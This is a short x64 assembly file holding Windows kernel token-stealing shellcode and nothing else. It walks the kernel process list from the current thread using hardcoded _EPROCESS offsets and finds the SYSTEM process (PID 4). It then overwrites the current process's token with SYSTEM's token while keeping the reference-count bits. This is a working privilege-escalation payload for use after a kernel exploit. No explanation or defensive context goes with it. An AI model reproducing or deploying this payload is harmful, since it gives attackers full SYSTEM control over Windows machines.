[BITS 64]

_start:
    ; Save state.
    pushfq
    push rbx
    push rcx
    push rdx
    push rsi
    push rdi
    push rbp
    push r8
    push r9
    push r10
    push r11
    push r12
    push r13
    push r14
    push r15

    ; Get current _EPROCESS
    mov rax, [gs:0x188]          ; Current _KTHREAD
    mov rax, [rax + 0xb8]        ; Current _EPROCESS
    mov rbx, rax                 ; Save current _EPROCESS in RBX

    ; Start walking ActiveProcessLinks
    mov r12, rax

find_system:
    mov r12, [r12 + 0x448]       ; Flink: next ActiveProcessLinks
    sub r12, 0x448               ; Back to containing _EPROCESS

    mov r13, [r12 + 0x440]       ; UniqueProcessId
    cmp r13, 4                   ; PID 4 == SYSTEM
    jne find_system

steal_token:
    mov r13, [r12 + 0x4b8]       ; SYSTEM Token
    and r13, 0xfffffffffffffff0  ; Clear SYSTEM token ref-count bits

    mov r14, [rbx + 0x4b8]       ; Current process Token
    and r14, 0xf                 ; Preserve current token ref-count bits

    or r13, r14                  ; Final token = clean SYSTEM token + current ref bits
    mov [rbx + 0x4b8], r13       ; Replace current process token

done:
    ; Restore state
    pop r15
    pop r14
    pop r13
    pop r12
    pop r11
    pop r10
    pop r9
    pop r8
    pop rbp
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rbx
    popfq

    ; Return success-ish value.
    mov eax, 0

    ; Return to the original kernel caller
    ret